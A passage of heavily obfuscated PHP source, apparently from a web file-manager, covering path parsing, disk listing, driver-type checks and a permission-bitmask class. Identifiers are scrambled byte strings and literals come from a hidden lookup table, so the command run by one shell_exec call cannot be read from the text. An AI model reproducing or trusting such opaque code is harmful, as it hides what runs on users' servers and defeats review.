private static function saveData($“Ã™‘¢, $¸¡ÜÏ§Ä) { $ »Íé =& $_SERVER[íïàËŸë]; self::log($ »Íé[1343] . $“Ã™‘¢ . $ »Íé[74] . count($¸¡ÜÏ§Ä), $ »Íé[835]); if ($¸¡ÜÏ§Ä) { return IO::setContent($“Ã™‘¢, json_encode($¸¡ÜÏ§Ä)); } $àË¶‡Ó = IO::pathFather($“Ã™‘¢); IO::remove($“Ã™‘¢); self::clearEmptyFolder($àË¶‡Ó); return !0; } public static function clearEmptyFolder($¾…¦„Éà) { $ªñøæùè =& $_SERVER[íïàËŸë]; if (trim($¾…¦„Éà, $ªñøæùè[8]) == trim(self::$_historyBase, $ªñøæùè[8])) { return; } $ ¯ë¡®¹ = IO::pathFather($¾…¦„Éà); $Õ…í™îË = IO::has($¾…¦„Éà, !0); if ($Õ…í™îË[$ªñøæùè[239]] > 0 || $Õ…í™îË[$ªñøæùè[240]] > 0) { return; } IO::remove($¾…¦„Éà); self::clearEmptyFolder($ ¯ë¡®¹); } private static function getBasePath() { $‰ª–¡’ª =& $_SERVER[íïàËŸë]; $°èüøóå = Model($‰ª–¡’ª[1344])->get($‰ª–¡’ª[1345]); if ($°èüøóå) { if (!IO::exist($°èüøóå)) { IO::mkdir($°èüøóå); } if (get_path_this($°èüøóå) == $‰ª–¡’ª[1330]) { $½÷ÃòØ› = $‰ª–¡’ª[1346] . rand_string(8); @rename($°èüøóå, get_path_father($°èüøóå) . $‰ª–¡’ª[8] . $½÷ÃòØ›); $°èüøóå = DATA_PATH . $½÷ÃòØ› . $‰ª–¡’ª[8]; file_put_contents(DATA_PATH . $‰ª–¡’ª[1277], $‰ª–¡’ª[12]); Model($‰ª–¡’ª[1344])->set($‰ª–¡’ª[1345], $°èüøóå); } return $°èüøóå; } $°èüøóå = DATA_PATH . $‰ª–¡’ª[1346] . rand_string(8) . $‰ª–¡’ª[8]; $°èüøóå = IO::mkdir($°èüøóå); $°èüøóå = rtrim($°èüøóå, $‰ª–¡’ª[8]) . $‰ª–¡’ª[8]; file_put_contents($°èüøóå . $‰ª–¡’ª[1277], $‰ª–¡’ª[12]); file_put_contents(DATA_PATH . $‰ª–¡’ª[1277], $‰ª–¡’ª[12]); Model($‰ª–¡’ª[1344])->set($‰ª–¡’ª[1345], $°èüøóå); return $°èüøóå; } } class KodIO { const KOD_SOURCE = "\x7b\x73\157\x75\162\x63\x65\x7d"; const KOD_USER_RECYCLE = "\173\165\163\145\162\122\x65\x63\171\143\154\x65\x7d"; const KOD_USER_FAV = "\173\x75\x73\145\x72\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\173\165\x73\x65\x72\x46\x69\154\x65\124\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\165\163\145\x72\x46\x69\x6c\145\124\x79\160\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\173\x67\x72\x6f\165\160\x52\157\x6f\164\x53\x65\154\146\175"; const KOD_USER_SHARE = "\x7b\x75\163\x65\162\x53\150\x61\162\145\175"; const KOD_USER_SHARE_LINK = "\173\x75\163\145\x72\x53\150\141\162\x65\x4c\x69\156\x6b\x7d"; const KOD_USER_SHARE_TO_ME = "\173\x73\x68\x61\x72\x65\124\x6f\x4d\145\175"; const KOD_SHARE_ITEM = "\x7b\x73\150\x61\162\145\111\x74\x65\155\x7d"; const KOD_SHARE_LINK = "\173\x73\x68\141\x72\145\111\x74\x65\155\x4c\151\156\153\x7d"; const KOD_SEARCH = "\173\163\145\141\x72\143\x68\x7d"; const KOD_BLOCK = "\173\142\x6c\x6f\x63\x6b\175"; const KOD_IO = "\173\x69\x6f\x7d"; const KOD_USER_RECENT = "\173\165\x73\x65\162\x52\x65\156\x63\x65\156\164\x7d"; const KOD_USER_DRIVER = "\x7b\x64\x72\151\x76\x65\x72\x7d"; public static function typeList() { $Ä‹­‰±¤ =& $_SERVER[íïàËŸë]; return array($Ä‹­‰±¤[1347] => self::KOD_SOURCE, $Ä‹­‰±¤[1348] => self::KOD_USER_RECYCLE, $Ä‹­‰±¤[1349] => self::KOD_USER_FAV, $Ä‹­‰±¤[1350] => self::KOD_USER_FILE_TAG, $Ä‹­‰±¤[1351] => self::KOD_USER_FILE_TYPE, $Ä‹­‰±¤[1352] => self::KOD_GROUP_ROOT_SELF, $Ä‹­‰±¤[1353] => self::KOD_USER_SHARE, $Ä‹­‰±¤[1354] => self::KOD_USER_SHARE_LINK, $Ä‹­‰±¤[1355] => self::KOD_USER_SHARE_TO_ME, $Ä‹­‰±¤[1356] => self::KOD_SHARE_ITEM, $Ä‹­‰±¤[1357] => self::KOD_SHARE_LINK, $Ä‹­‰±¤[1358] => self::KOD_SEARCH, $Ä‹­‰±¤[1359] => self::KOD_BLOCK, $Ä‹­‰±¤[1360] => self::KOD_IO, $Ä‹­‰±¤[1361] => self::KOD_USER_RECENT, $Ä‹­‰±¤[1362] => self::KOD_USER_DRIVER); } public static function parse($ÊŞÉö³) { $¹¯áÔ =& $_SERVER[íïàËŸë]; $ÊŞÉö³ = self::clear($ÊŞÉö³); $‹ê’Şã± = array_values(self::typeList()); preg_match($¹¯áÔ[1363], $ÊŞÉö³, $¼ÀîĞ¦ü); $ı¾²ìŒ = array($¹¯áÔ[496] => !1, $¹¯áÔ[1364] => !1, $¹¯áÔ[493] => !1, $¹¯áÔ[87] => $ÊŞÉö³, $¹¯áÔ[1262] => !1, $¹¯áÔ[1261] => $¹¯áÔ[12]); if (is_array($¼ÀîĞ¦ü) && count($¼ÀîĞ¦ü) == 5) { $§£•„Áå = $¹¯áÔ[1365] . $¼ÀîĞ¦ü[2] . $¹¯áÔ[403]; if (in_array($§£•„Áå, $‹ê’Şã±)) { $ı¾²ìŒ[$¹¯áÔ[1262]] = $¼ÀîĞ¦ü[1]; $ı¾²ìŒ[$¹¯áÔ[33]] = $§£•„Áå; $ı¾²ìŒ[$¹¯áÔ[1366]] = substr($§£•„Áå, 1, -1); $ı¾²ìŒ[$¹¯áÔ[475]] = $¼ÀîĞ¦ü[3]; } $ı¾²ìŒ[$¹¯áÔ[1261]] = $¼ÀîĞ¦ü[4]; } $çéÜØŞ„ = array($¹¯áÔ[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_USER_DRIVER); $ı¾²ìŒ[$¹¯áÔ[1329]] = in_array($ı¾²ìŒ[$¹¯áÔ[33]], $çéÜØŞ„); return $ı¾²ìŒ; } public static function isTruePath($Âäèà¡‚) { $´ŞÌ§ßä =& $_SERVER[íïàËŸë]; if (substr($Âäèà¡‚, 0, 1) != $´ŞÌ§ßä[1365]) { return !0; } if (strpos($Âäèà¡‚, $´ŞÌ§ßä[483]) === 0) { return !0; } if (strpos($Âäèà¡‚, $´ŞÌ§ßä[1333]) === 0) { return !0; } if (strpos($Âäèà¡‚, $´ŞÌ§ßä[1367]) === 0) { return !0; } if (strpos($Âäèà¡‚, $´ŞÌ§ßä[1368]) === 0) { return !0; } if (strpos($Âäèà¡‚, $´ŞÌ§ßä[1369]) === 0) { return !0; } return !1; } public static function clear($®ĞÙÙñî) { $¥¼Íôùç =& $_SERVER[íïàËŸë]; $®ĞÙÙñî = str_replace(array($¥¼Íôùç[1168], $¥¼Íôùç[262]), $¥¼Íôùç[53], $®ĞÙÙñî); $®ĞÙÙñî = str_replace($¥¼Íôùç[100], $¥¼Íôùç[8], $®ĞÙÙñî); $ÚœÌÏ«† = $¥¼Íôùç[1370]; if (substr($®ĞÙÙñî, 0, 3) == $¥¼Íôùç[1371]) { $®ĞÙÙñî = substr($®ĞÙÙñî, 3); } while (strstr($®ĞÙÙñî, $ÚœÌÏ«†)) { $®ĞÙÙñî = str_replace($ÚœÌÏ«†, $¥¼Íôùç[8], $®ĞÙÙñî); } $®ĞÙÙñî = preg_replace($¥¼Íôùç[1372], $¥¼Íôùç[8], $®ĞÙÙñî); if ($®ĞÙÙñî == $¥¼Íôùç[8]) { return $¥¼Íôùç[8]; } $®ĞÙÙñî = rtrim($®ĞÙÙñî, $¥¼Íôùç[8]); return $®ĞÙÙñî; } public static function pathTrue($¼£…ê×¯) { $‡ıò‰Ò¶ =& $_SERVER[íïàËŸë]; if (!$¼£…ê×¯) { return $‡ıò‰Ò¶[12]; } $¼£…ê×¯ = str_replace($‡ıò‰Ò¶[592], $‡ıò‰Ò¶[8], str_replace($‡ıò‰Ò¶[1373], $‡ıò‰Ò¶[8], $¼£…ê×¯)); $¼£…ê×¯ = str_replace($‡ıò‰Ò¶[592], $‡ıò‰Ò¶[8], str_replace($‡ıò‰Ò¶[1373], $‡ıò‰Ò¶[8], $¼£…ê×¯)); if (!strstr($¼£…ê×¯, $‡ıò‰Ò¶[1371])) { return $¼£…ê×¯; } $¦ÅĞ×â = explode($‡ıò‰Ò¶[8], $¼£…ê×¯); foreach ($¦ÅĞ×â as $øãùÒ™› => $íğÜ–ÒÎ) { if ($íğÜ–ÒÎ !== $‡ıò‰Ò¶[1374]) { continue; } for ($ªÔ“¤Ö = $øãùÒ™›; $ªÔ“¤Ö >= 0; $ªÔ“¤Ö--) { if ($¦ÅĞ×â[$ªÔ“¤Ö] === $‡ıò‰Ò¶[10] || $¦ÅĞ×â[$ªÔ“¤Ö] === $‡ıò‰Ò¶[1374] || $¦ÅĞ×â[$ªÔ“¤Ö] === -1) { continue; } if ($¦ÅĞ×â[$ªÔ“¤Ö] === $‡ıò‰Ò¶[12]) { $¦ÅĞ×â[$øãùÒ™›] = -1; break; } $¦ÅĞ×â[$øãùÒ™›] = -1; $¦ÅĞ×â[$ªÔ“¤Ö] = -1; break; } } $··ŸÖÓÙ = array(); foreach ($¦ÅĞ×â as $íğÜ–ÒÎ) { if ($íğÜ–ÒÎ !== -1) { $··ŸÖÓÙ[] = $íğÜ–ÒÎ; } } $÷˜“Ô„Ş = implode($‡ıò‰Ò¶[8], $··ŸÖÓÙ); if (strpos($÷˜“Ô„Ş, $‡ıò‰Ò¶[1375]) === 0) { $÷˜“Ô„Ş = $‡ıò‰Ò¶[1371] . substr($÷˜“Ô„Ş, strlen($‡ıò‰Ò¶[1375])); } return $÷˜“Ô„Ş; } public static function pathUrlClear($¨Ü‡¹¨Ñ) { $’•˜şîÍ =& $_SERVER[íïàËŸë]; if (!$¨Ü‡¹¨Ñ) { return $¨Ü‡¹¨Ñ; } $¨Ü‡¹¨Ñ = rawurldecode($¨Ü‡¹¨Ñ); $¨Ü‡¹¨Ñ = str_replace($’•˜şîÍ[1373], $’•˜şîÍ[8], $¨Ü‡¹¨Ñ); if (strpos($¨Ü‡¹¨Ñ, $’•˜şîÍ[76]) > 0) { $¨Ü‡¹¨Ñ = substr($¨Ü‡¹¨Ñ, 0, strpos($¨Ü‡¹¨Ñ, $’•˜şîÍ[76])); } if (strpos($¨Ü‡¹¨Ñ, $’•˜şîÍ[1376]) > 0) { $¨Ü‡¹¨Ñ = substr($¨Ü‡¹¨Ñ, 0, strpos($¨Ü‡¹¨Ñ, $’•˜şîÍ[1376])); } return $¨Ü‡¹¨Ñ; } public static function sourceID($á¨š…÷Ğ) { $‚ˆİˆ±Î =& $_SERVER[íïàËŸë]; $İô¡Ù¿• = self::parse($á¨š…÷Ğ); if ($İô¡Ù¿•[$‚ˆİˆ±Î[33]] !== self::KOD_SOURCE) { show_json(LNG($‚ˆİˆ±Î[1377]), !1); } return $İô¡Ù¿•[$‚ˆİˆ±Î[475]]; } public static function make($Ì²ïÇ¿ã) { if (!$Ì²ïÇ¿ã) { return !1; } return self::makePath(self::KOD_SOURCE, intval($Ì²ïÇ¿ã)); } public static function makeShare($¥šèü¿ã, $©ù¶ßë¬) { return self::makePath(self::KOD_SHARE_ITEM, $¥šèü¿ã, $©ù¶ßë¬); } public static function makeFileTypePath($ÇÜ›»è÷) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÇÜ›»è÷); } public static function makeFileTagPath($ÜøõØÃ˜) { return self::makePath(self::KOD_USER_FILE_TAG, $ÜøõØÃ˜); } public static function makePath($ùßÉ«Õ¶, $úµúá¾® = '', $ó· ³¶³ = '') { $Ò‰ìÀß =& $_SERVER[íïàËŸë]; $˜¼°¶Ü‘ = substr($ùßÉ«Õ¶, 1, -1); $¶”¢´ÈÜ = $Ò‰ìÀß[1378] . $˜¼°¶Ü‘ . $Ò‰ìÀß[1379] . $úµúá¾® . $Ò‰ìÀß[1380]; $¶”¢´ÈÜ = $ó· ³¶³ ? $¶”¢´ÈÜ . $ó· ³¶³ . $Ò‰ìÀß[8] : $¶”¢´ÈÜ; return $¶”¢´ÈÜ; } public static function hashPath($³èƒµ±, $”Ãğ¥å¦ = true) { $œÒ¸Ñúù =& $_SERVER[íïàËŸë]; $„·æºñË = is_array($³èƒµ±) ? $³èƒµ± : IO::info($³èƒµ±); $¢ÈĞÀş = _get($„·æºñË, $œÒ¸Ñúù[1381], $œÒ¸Ñúù[12]); if (!$¢ÈĞÀş && isset($„·æºñË[$œÒ¸Ñúù[235]])) { $¢ÈĞÀş = trim($„·æºñË[$œÒ¸Ñúù[235]], $œÒ¸Ñúù[121]); } if (!$¢ÈĞÀş && isset($„·æºñË[$œÒ¸Ñúù[193]]) && $„·æºñË[$œÒ¸Ñúù[193]]) { $„·æºñË = IO::info(KodIO::make($„·æºñË[$œÒ¸Ñúù[193]])); $¢ÈĞÀş = _get($„·æºñË, $œÒ¸Ñúù[1381], $œÒ¸Ñúù[12]); } $Ñ†×œİ» = md5($„·æºñË[$œÒ¸Ñúù[87]] . $„·æºñË[$œÒ¸Ñúù[79]] . $„·æºñË[$œÒ¸Ñúù[88]]); if (!$¢ÈĞÀş && file_exists($„·æºñË[$œÒ¸Ñúù[87]])) { $¢ÈĞÀş = Cache::get($Ñ†×œİ» . $œÒ¸Ñúù[1382]); $¢ÈĞÀş = !1; if (!$¢ÈĞÀş) { $¢ÈĞÀş = IO::hashSimple($„·æºñË[$œÒ¸Ñúù[87]]); Cache::set($Ñ†×œİ» . $œÒ¸Ñúù[1382], $¢ÈĞÀş, 3600 * 24 * 30); } } if ($”Ãğ¥å¦ && !$¢ÈĞÀş) { } return $¢ÈĞÀş ? $¢ÈĞÀş : $Ñ†×œİ»; } public static function hashPathSafe($¬Ã½ßªó, $ÓêÇúš = true) { $Ú¿¸¶ûî =& $_SERVER[íïàËŸë]; $¯èÄ±µ = self::hashPath($¬Ã½ßªó, $ÓêÇúš); return md5($¯èÄ±µ . $Ú¿¸¶ûî[1383] . Model($Ú¿¸¶ûî[853])->get($Ú¿¸¶ûî[854])); } public static function initSystemPath() { $ê†ö¸Ë› =& $_SERVER[íïàËŸë]; if (defined($ê†ö¸Ë›[1384])) { return; } define($ê†ö¸Ë›[1384], self::systemPath($ê†ö¸Ë›[191])); define($ê†ö¸Ë›[1385], self::systemPath($ê†ö¸Ë›[1386])); define($ê†ö¸Ë›[1387], self::systemPath($ê†ö¸Ë›[1388])); define($ê†ö¸Ë›[1389], self::systemPath($ê†ö¸Ë›[1390])); IOHistory::bindEvent(); } public static function systemPath($ØÂ–àã) { $˜±èŸÚ¿ =& $_SERVER[íïàËŸë]; $üœç„õÙ = $˜±èŸÚ¿[1391] . ucfirst($ØÂ–àã); $ÃğşÛ = Model($˜±èŸÚ¿[853])->get($üœç„õÙ); if ($ÃğşÛ) { return $ÃğşÛ; } if ($ØÂ–àã == $˜±èŸÚ¿[191]) { $ÃğşÛ = self::make(Model($˜±èŸÚ¿[907])->systemRootPathAdd($˜±èŸÚ¿[605])); } else { $ÃğşÛ = self::systemPath($˜±èŸÚ¿[191]); $ß…ƒµù = self::sourceID($ÃğşÛ); $ÃğşÛ = self::make(Model($˜±èŸÚ¿[907])->mkdir($ß…ƒµù, $ØÂ–àã)); } Model($˜±èŸÚ¿[853])->set($üœç„õÙ, $ÃğşÛ); return $ÃğşÛ; } public static function systemFolder($ÓÌº¬Ê) { $Ç Å±Òì = IO_PATH_SYSTEM_SOURCE . $ÓÌº¬Ê; $úõ›ÊÁ = Cache::get($Ç Å±Òì); if (!$úõ›ÊÁ) { $—‡¯ıı = IO::infoFullSimple($Ç Å±Òì); if (!$—‡¯ıı) { $úõ›ÊÁ = IO::mkdir($Ç Å±Òì, REPEAT_SKIP); } else { $úõ›ÊÁ = $—‡¯ıı[$_SERVER[íïàËŸë][87]]; } Cache::set($Ç Å±Òì, $úõ›ÊÁ, 3600 * 10); } return $úõ›ÊÁ; } public static function defaultDriver() { return Model($_SERVER[íïàËŸë][850])->defaultDriver(); } public static function defaultIO() { $Í¸İÓ…ƒ =& $_SERVER[íïàËŸë]; $áÀµ®ã‰ = self::defaultDriver(); return $Í¸İÓ…ƒ[1392] . $áÀµ®ã‰[$Í¸İÓ…ƒ[475]] . $Í¸İÓ…ƒ[1380]; } public static function defaultDriverInit() { static $š¹·¥÷¸ = false; if ($š¹·¥÷¸) { return $š¹·¥÷¸; } $š¹·¥÷¸ = IO::init(self::defaultIO()); return $š¹·¥÷¸; } public static function fileTypeList() { $ûô‰ãªî =& $_SERVER[íïàËŸë]; $ë¤²é– = $GLOBALS[$ûô‰ãªî[6]][$ûô‰ãªî[1393]]; foreach ($ë¤²é– as $¢ÏŒ¨Å‡ => $ú»¸’œÆ) { $†¬å¤Œ = $ûô‰ãªî[1394] . $¢ÏŒ¨Å‡; $½ŒÙ¦­† = LNG($†¬å¤Œ); if ($†¬å¤Œ != $½ŒÙ¦­†) { $ë¤²é–[$¢ÏŒ¨Å‡][$ûô‰ãªî[32]] = $½ŒÙ¦­†; } } return $ë¤²é–; } public static function diskList($éœß¬ü = true) { $Èçœ¨ê˜ = $_SERVER[íïàËŸë][1395]; if ($éœß¬ü) { $ÙªÛ§’£ = Cache::get($Èçœ¨ê˜); if (is_array($ÙªÛ§’£)) { return $ÙªÛ§’£; } } $ÙªÛ§’£ = self::diskListGet(); Cache::set($Èçœ¨ê˜, $ÙªÛ§’£, 60); return $ÙªÛ§’£; } public static function diskListGet() { $Ê´Íê¹ú =& $_SERVER[íïàËŸë]; $·ªœ†ï˜ = array(); if ($GLOBALS[$Ê´Íê¹ú[6]][$Ê´Íê¹ú[1396]] == $Ê´Íê¹ú[1397]) { $İ„¢ó“š = $Ê´Íê¹ú[1398]; for ($—ĞÃéÒâ = 0; $—ĞÃéÒâ < strlen($İ„¢ó“š); $—ĞÃéÒâ++) { $Š»¸ÓÛŠ = $İ„¢ó“š[$—ĞÃéÒâ] . $Ê´Íê¹ú[1399]; if (file_exists($Š»¸ÓÛŠ)) { $·ªœ†ï˜[] = $Š»¸ÓÛŠ; } } return $·ªœ†ï˜; } if (!function_exists($Ê´Íê¹ú[101])) { $·ªœ†ï˜[] = $Ê´Íê¹ú[925]; return $·ªœ†ï˜; } $¬¤ğìë‰ = explode($Ê´Íê¹ú[262], shell_exec($Ê´Íê¹ú[1400])); array_shift($¬¤ğìë‰); array_pop($¬¤ğìë‰); $ó…ñèÈµ = array($Ê´Íê¹ú[1401], $Ê´Íê¹ú[1402], $Ê´Íê¹ú[1403], $Ê´Íê¹ú[1404], $Ê´Íê¹ú[1405], $Ê´Íê¹ú[1406], $Ê´Íê¹ú[1407], $Ê´Íê¹ú[1408]); foreach ($¬¤ğìë‰ as $ÌíÖ¥Ûà) { $ÇÆåÌ°º = preg_split($Ê´Íê¹ú[1409], $ÌíÖ¥Ûà); $Š»¸ÓÛŠ = $ÇÆåÌ°º[count($ÇÆåÌ°º) - 1]; if (!strstr($ÇÆåÌ°º[0], $Ê´Íê¹ú[1410]) || !$Š»¸ÓÛŠ) { continue; } $ø“©›Šë = rtrim($Š»¸ÓÛŠ, $Ê´Íê¹ú[8]) . $Ê´Íê¹ú[8]; if (in_array($ø“©›Šë, $ó…ñèÈµ)) { continue; } $·ªœ†ï˜[] = $ø“©›Šë; } return $·ªœ†ï˜; } public static function isSameDisk($Ê¾ıØ˜ª, $¤Ÿ–¸üò) { $æ‡®´ÈÚ =& $_SERVER[íïàËŸë]; if ($GLOBALS[$æ‡®´ÈÚ[6]][$æ‡®´ÈÚ[1396]] == $æ‡®´ÈÚ[1397]) { return strtolower(substr($Ê¾ıØ˜ª, 0, 1)) == strtolower(substr($¤Ÿ–¸üò, 0, 1)); } $†ÜÁ¨‡ = self::diskList(); $ì·ËÄª = !1; $»åÎôÕë = !1; sort($†ÜÁ¨‡); $†ÜÁ¨‡ = array_reverse($†ÜÁ¨‡); $Ê¾ıØ˜ª = rtrim($Ê¾ıØ˜ª, $æ‡®´ÈÚ[8]) . $æ‡®´ÈÚ[8]; $¤Ÿ–¸üò = rtrim($¤Ÿ–¸üò, $æ‡®´ÈÚ[8]) . $æ‡®´ÈÚ[8]; foreach ($†ÜÁ¨‡ as $– úå–É) { $¯÷‡ä§é = strlen($– úå–É); if (!$ì·ËÄª && substr($Ê¾ıØ˜ª, 0, $¯÷‡ä§é) == $– úå–É) { $ì·ËÄª = $– úå–É; } if (!$»åÎôÕë && substr($¤Ÿ–¸üò, 0, $¯÷‡ä§é) == $– úå–É) { $»åÎôÕë = $– úå–É; } if ($ì·ËÄª && $»åÎôÕë) { break; } } return $ì·ËÄª === $»åÎôÕë; } public static function transferType($ª†€âØ, $šÑÇĞ©ò) { $ä¾üü¥ =& $_SERVER[íïàËŸë]; $¯ÔÉœıŒ = self::driverType($ª†€âØ); $íı°€¬Ñ = self::driverType($šÑÇĞ©ò); if ($¯ÔÉœıŒ[$ä¾üü¥[33]] == $íı°€¬Ñ[$ä¾üü¥[33]] && $¯ÔÉœıŒ[$ä¾üü¥[1411]] == $íı°€¬Ñ[$ä¾üü¥[1411]]) { return $ä¾üü¥[1412]; } if ($¯ÔÉœıŒ[$ä¾üü¥[33]] == $ä¾üü¥[958] && $íı°€¬Ñ[$ä¾üü¥[33]] == $ä¾üü¥[109]) { return $ä¾üü¥[1290]; } if ($¯ÔÉœıŒ[$ä¾üü¥[33]] == $ä¾üü¥[109] && $íı°€¬Ñ[$ä¾üü¥[33]] == $ä¾üü¥[958]) { return $ä¾üü¥[110]; } return $ä¾üü¥[1413]; } public static function driverType($ÔãşªÅë) { $˜¿äò¶£ =& $_SERVER[íïàËŸë]; $‰”¨óª = str_replace($˜¿äò¶£[1414], $˜¿äò¶£[12], strtolower($ÔãşªÅë->getType())); if ($‰”¨óª == $˜¿äò¶£[840] || $‰”¨óª == $˜¿äò¶£[1415] || $‰”¨óª == $˜¿äò¶£[1416]) { $ÔãşªÅë = self::defaultDriverInit(); } else { if ($‰”¨óª == $˜¿äò¶£[1300] || $‰”¨óª == $˜¿äò¶£[1417]) { $ÔãşªÅë = IO::init($ÔãşªÅë->pathParse[$˜¿äò¶£[1243]]); } } $èƒÏ İ = $ÔãşªÅë->path; $‰”¨óª = str_replace($˜¿äò¶£[1414], $˜¿äò¶£[12], strtolower($ÔãşªÅë->getType())); if ($‰”¨óª == $˜¿äò¶£[109]) { return array($˜¿äò¶£[33] => $˜¿äò¶£[109], $˜¿äò¶£[1411] => $˜¿äò¶£[12], $˜¿äò¶£[87] => $èƒÏ İ, $˜¿äò¶£[98] => $ÔãşªÅë); } return array($˜¿äò¶£[33] => $˜¿äò¶£[958], $˜¿äò¶£[1411] => $ÔãşªÅë->pathDriver, $˜¿äò¶£[87] => $èƒÏ İ, $˜¿äò¶£[98] => $ÔãşªÅë); } public static function pathDriverType($Ÿ‡ï™Ï) { return $Ÿ‡ï™Ï ? self::driverType(IO::init($Ÿ‡ï™Ï)) : !1; } public static function pathDriverLocal($ÉõØ»³Ã) { $×¹¤„‡ =& $_SERVER[íïàËŸë]; $İƒù”Â™ = $ÉõØ»³Ã ? self::driverType(IO::init($ÉõØ»³Ã)) : !1; return $İƒù”Â™[$×¹¤„‡[33]] == $×¹¤„‡[109] ? !0 : !1; } public static function allowCover($ç¿¾–°Õ, $íÎ™ú”Ú = true) { $ÈÍ–¦‹ =& $_SERVER[íïàËŸë]; if (is_string($ç¿¾–°Õ)) { $ç¿¾–°Õ = IO::info($ç¿¾–°Õ); } if (!$ç¿¾–°Õ || $ç¿¾–°Õ[$ÈÍ–¦‹[33]] == $ÈÍ–¦‹[78] || $ç¿¾–°Õ[$ÈÍ–¦‹[79]] <= 100) { return !1; } if (isset($ç¿¾–°Õ[$ÈÍ–¦‹[1418]]) || !$ç¿¾–°Õ[$ÈÍ–¦‹[87]]) { return !1; } if (isset($ç¿¾–°Õ[$ÈÍ–¦‹[232]]) && !$ç¿¾–°Õ[$ÈÍ–¦‹[232]]) { return !1; } static $˜˜¨Ûûï = false; if (!$˜˜¨Ûûï || !$íÎ™ú”Ú) { $—›˜¾Â = self::driverType(IO::init($ç¿¾–°Õ[$ÈÍ–¦‹[87]])); $Á±š®Œ = $—›˜¾Â[$ÈÍ–¦‹[98]]; $˜˜¨Ûûï = $ÈÍ–¦‹[196]; if ($—›˜¾Â[$ÈÍ–¦‹[33]] == $ÈÍ–¦‹[109]) { $˜˜¨Ûûï = $ÈÍ–¦‹[1419]; } if ($—›˜¾Â[$ÈÍ–¦‹[98]] && is_array($—›˜¾Â[$ÈÍ–¦‹[98]]->config)) { $Äòæ¡™ß = $—›˜¾Â[$ÈÍ–¦‹[98]]->config; if (isset($Äòæ¡™ß[$ÈÍ–¦‹[1420]]) && $Äòæ¡™ß[$ÈÍ–¦‹[1420]]) { $˜˜¨Ûûï = $ÈÍ–¦‹[1419]; } } } return $˜˜¨Ûûï == $ÈÍ–¦‹[1419] ? !0 : !1; } } goto Fî‡»éÎ; D±ÖŠåå‚à: class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $ì€¥³„Â =& $_SERVER[íïàËŸë]; $¸Ï‚¾ÓÓ = array(array($ì€¥³„Â[494] => LNG($ì€¥³„Â[1981]), $ì€¥³„Â[1982] => $ì€¥³„Â[1983], $ì€¥³„Â[1984] => 1, $ì€¥³„Â[1985] => 1, $ì€¥³„Â[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($ì€¥³„Â[494] => LNG($ì€¥³„Â[1987]), $ì€¥³„Â[1982] => $ì€¥³„Â[1988], $ì€¥³„Â[1984] => 2, $ì€¥³„Â[1985] => 1, $ì€¥³„Â[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($ì€¥³„Â[494] => LNG($ì€¥³„Â[1989]), $ì€¥³„Â[1982] => $ì€¥³„Â[1990], $ì€¥³„Â[1984] => 3, $ì€¥³„Â[1985] => 1, $ì€¥³„Â[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($ì€¥³„Â[494] => LNG($ì€¥³„Â[1991]), $ì€¥³„Â[1982] => $ì€¥³„Â[1992], $ì€¥³„Â[1984] => 4, $ì€¥³„Â[1985] => 1, $ì€¥³„Â[1986] => self::AUTH_SHOW | self::AUTH_VIEW), array($ì€¥³„Â[494] => LNG($ì€¥³„Â[1993]), $ì€¥³„Â[1982] => $ì€¥³„Â[1994], $ì€¥³„Â[1984] => 5, $ì€¥³„Â[1985] => 1, $ì€¥³„Â[1986] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($ì€¥³„Â[494] => LNG($ì€¥³„Â[1995]), $ì€¥³„Â[1982] => $ì€¥³„Â[1996], $ì€¥³„Â[1984] => 6, $ì€¥³„Â[1985] => 1, $ì€¥³„Â[1986] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($ì€¥³„Â[494] => LNG($ì€¥³„Â[1997]), $ì€¥³„Â[1982] => $ì€¥³„Â[1998], $ì€¥³„Â[1984] => 7, $ì€¥³„Â[1985] => 1, $ì€¥³„Â[1986] => 0)); return $¸Ï‚¾ÓÓ; } public static function authCheck($ğøÀıó, $„íúÁ¦Ö) { $ö˜ — =& $_SERVER[íïàËŸë]; $ğøÀıó = intval($ğøÀıó); if (KodUser::isRoot() && $GLOBALS[$ö˜ —[6]][$ö˜ —[1999]]) { return !0; } if ($ğøÀıó <= 0) { return !1; } if (($ğøÀıó & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return !!($ğøÀıó & $„íúÁ¦Ö); } public static function authCheckShow($âÔ¿ûáÍ) { return self::authCheck($âÔ¿ûáÍ, self::AUTH_SHOW); } public static function authCheckView($µÖÄÇĞ) { return self::authCheck($µÖÄÇĞ, self::AUTH_VIEW); } public static function authCheckDownload($×¾¥ƒêÚ) { return self::authCheck($×¾¥ƒêÚ, self::AUTH_DOWNLOAD); } public static function authCheckUpload($ƒş®) { return self::authCheck($ƒş®, self::AUTH_UPLOAD); } public static function authCheckEdit($âÈ–÷û) { return self::authCheck($âÈ–÷û, self::AUTH_EDIT); } public static function authCheckRemove($ßĞ¥¯÷) { return self::authCheck($ßĞ¥¯÷, 